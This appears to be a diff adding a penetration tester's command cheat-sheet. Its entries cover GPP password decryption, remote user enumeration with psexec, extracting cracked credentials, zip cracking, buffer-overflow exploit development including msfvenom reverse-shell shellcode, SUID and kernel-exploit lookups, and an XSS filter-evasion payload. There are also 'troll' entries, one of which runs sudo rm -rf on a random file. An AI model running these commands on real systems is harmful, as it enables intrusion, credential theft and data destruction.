@@ -1,0 +1,298 @@
+10.0.0.0/8 (10.255.255.255) | 172.16.0.0/12 (172.31.255.255) | 192.168.0.0/16 | 100.64.0.0/10 (10.127.255.255)
+Internal Address ranges, 100 is for routing
+Innes
+EOC
+Networking
+reference
+EOT
+https://tools.ietf.org/html/rfc1918
+EOR
+/usr/bin/gpp-decrypt [cpassword]
+Decrypt group policy preferences password aka Cpassword, use LAPS not GPP
+Innes
+EOC
+smb
+hashes
+privilege escalation
+EOT
+http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
+EOR
+sudo rm -rf $(sudo find / -type f | shuf -n1)
+Pick a file at random . . .
+Innes
+EOC
+Troll
+EOT
+https://devnull-as-a-service.com/one-less-to-go.sh
+EOR 
+psexec.py '[user]':[pass]]@[ip] "query user"  -- 
+List logged in users on the remote host, usefull before triggering AV or wanting to RDP in
+Innes
+EOC
+impacket
+enumeration
+privilege escaltion
+EOT
+https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
+EOR
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
+Most used Terminal commands
+Innes
+EOC
+linux
+interesting
+bash
+EOT
+http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
+EOR
+cat [file]  | grep "ACCOUNT FOUND" | grep -v 0x000072:STATUS_ACCOUNT_DISABLED | awk  -F User: '{print $2}' | awk -F : '{print $1, $2}' | awk -F \\[SUC '{print $1}' | awk -F " Password  " '{print $1":"$2}' | sort | sed s/' '/''/| uniq 
+Grab Succsessfull passwords from a tee'd medusa, bah to spaces in usernames
+Innes
+EOC
+hashes
+scanning
+EOT
+http://foofus.net/goons/jmk/medusa/medusa.html
+http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
+EOR
+for i in `cat ../clean_creds`; do echo $i | awk -F : '{print "tsql -S [IP] -p 1433 -U [domain]\\\\"$2" -P "$3}'; done
+Take the active users output and create filled in CMD's, course it can be anything, not just TSQL
+Innes
+EOC
+bash
+loop
+scanning
+EOT
+https://www.cyberciti.biz/faq/bash-for-loop/
+EOR
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+Project your mic to remote hosts speakers
+Innes
+EOC
+linux
+interesting
+bash
+EOT
+http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
+EOR
+apt-file update; apt-file search [xfreerdp]
+Equivlent of Yum whatprovides : What provides what file
+Innes
+EOC
+package management
+EOT
+http://kvz.io/blog/2008/11/08/search-for-a-package-with-aptfile/
+EOR
+yum whatproivdes 
+Equivlent of apt-file search : What provides what file
+Innes
+EOC
+package management
+EOT
+http://stackoverflow.com/questions/1133495/how-do-i-find-which-rpm-package-supplies-a-file-im-looking-for
+EOR
+fcrackzip -D -p 'x' -u test.zip
+Crack a ZIP file with a wordlist
+Innes
+EOC
+Cracking
+EOT
+http://allanfeid.com/content/cracking-zip-files-fcrackzip
+EOR
+fcrackzip -D -p 'x' -u test.zip
+Crack a zip, brute force a 4 char password 
+Innes
+EOC
+Cracking
+EOT
+http://allanfeid.com/content/cracking-zip-files-fcrackzip
+EOR
+perl -e 'print "A"x10000; print "\n"'
+Repeat A x times pipe into where you think the overflow location is, look for 0x41's
+Innes
+EOC
+buffer overflow
+perl
+EOT
+http://stackoverflow.com/questions/277485/how-can-i-repeat-a-string-n-times-in-perl
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
+EOR
+pattern_create.rb -l 2700
+create a patern of 2700 bytes to isolate the buffer size you have, part of msf, look for value of EIP 
+Innes
+EOC
+buffer overflow
+metasploit
+EOT
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
+EOR
+pattern_offset.rb -l 2700 -q [EIP]
+Get the exact offset for the EIP
+Innes
+EOC
+buffer overflow
+metasploit
+EOT
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
+EOR
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+Bad Char's block, re-send removing bad ones
+Innes
+EOC
+buffer overflow
+EOT
+https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+EOR
+!mona modules
+Work out if there are any juicy targets to look for a jmp esp in (imunity debuger)
+Innes
+EOC
+buffer overflow
+mona
+EOT
+https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
+https://github.com/corelan/mona
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+EOR
+!mona find '\xff\xef' -m [dll]
+Look for a JMP ESP in the DLL found in the mona modules
+Innes
+EOC
+buffer overflow
+mona
+EOT
+https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
+https://github.com/corelan/mona
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+EOR
+msfvenom -p windows/shell_reverse_tcp LHOST=[LIP] LPORT=[LPORT] -f c -b "\x00" 
+Create shellcode which connects back on port can add –e x86/shikata_ga_nai, -b is bad chars
+Innes
+EOC
+buffer overflow
+metasploit
+EOT
+https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
+EOR
+xrandr   --output `xrandr -q | grep "connected" | grep -v dis | awk '{print $1}' | head -n 1` --rotate  inverted
+Anoy a co-worker by rotating their screen
+Innes
+EOC
+interseting
+troll
+EOT
+https://www.faqforge.com/linux/rotating-screen-in-ubuntu-and-linux-mint/
+EOR
+find / \( -type f -a -user root -a -perm -4001 \) 
+Locate SUID files owned by root
+Innes
+EOC
+linux
+privilege escalation
+EOT
+https://pen-testing.sans.org/resources/papers/gcih/discovering-local-suid-exploit-105447
+https://www.pentestpartners.com/blog/exploiting-suid-executables/
+EOR
+echo "https://www.kernel-exploits.com/kernel/?version="`uname -r  | awk -F . '{print $1"."$2}'`
+Quick formatted link to check ketne exploits
+Innes
+EOC
+linux
+privilege escalation
+EOT
+https://www.kernel-exploits.com
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+EOR
+<% style=behavior:url(: onreadystatechange=alert(1)>
+Asp.net filter evasion
+Innes
+EOC
+XSS
+web application
+EOT
+https://prezi.com/sfiyqpfngyor/xss-stylebehavior-urlhttphackersorgxsshtc/
+http://blog.innerht.ml/cascading-style-scripting/
+EOR
+patator.py unzip_pass zipfile=[file] password=FILE0 0=[pass.txt] -x ignore:code!=0
+Crack a zip file, Note: Older enc only
+Innes
+EOC
+cracking
+brute force
+EOT
+https://github.com/lanjelot/patator
+EOR
+softwareupdate -l
+Show updates available to a MacOS device
+Innes
+EOC
+Apple
+EOT
+http://osxdaily.com/2011/01/13/install-mac-os-x-software-updates-terminal/
+EOR
+man -P 'less -p ".*Tables"' ascii
+Show a compact ascii table
+Rezkon
+EOC
+Reference
+encoding
+ascii
+web app
+EOT
+http://man7.org/linux/man-pages/man7/ascii.7.html
+EOR
+nmap -sU --top-ports 1000 -oA clientname_udp -iL scope -v --open & nmap -A -oA clientname_ce -p- -iL scope -v --open & nmap -A -oA clientname_ce_quick --script /usr/share/nmap/scripts/http-screenshot.nse -p 80,443,21,22,23,25,109,110,990,465,1194,1723,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -iL scope -v --open;
+Do a quick nmap of the top 1000 UDP, all TCP, and common HTTP ports
+Innes
+EOC
+Cyber Essentials
+tools
+EOT
+https://necurity.co.uk
+https://www.ncsc.gov.uk/content/files/scheme_downloads/cyber-essentials-test-specs.pdf
+EOR
+<%="Hello Word"%>
+Echo hello world, test for RCE in JSP application.
+Innes
+EOC
+web application
+code execution
+jsp
+EOT
+https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
+EOR
+out.print("Hello World");
+Echo hello world, test for RCE in JSP application.
+Innes
+EOC
+web application
+code execution
+jsp
+EOT
+https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
+EOR
+<c:out value="${[variableName]}" />
+Echo hello world, test for RCE in JSP application.
+Innes
+EOC
+web application
+code execution
+jsp
+EOT
+https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
+EOR
+for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v "......................................................" | sed s/.*11/11/g | grep "11.*99"  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done
+Convert exfil ICMP back to files from pcap
+Innes
+EOC
+linux
+networking
+loop
+EOT
+https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only
+EOR
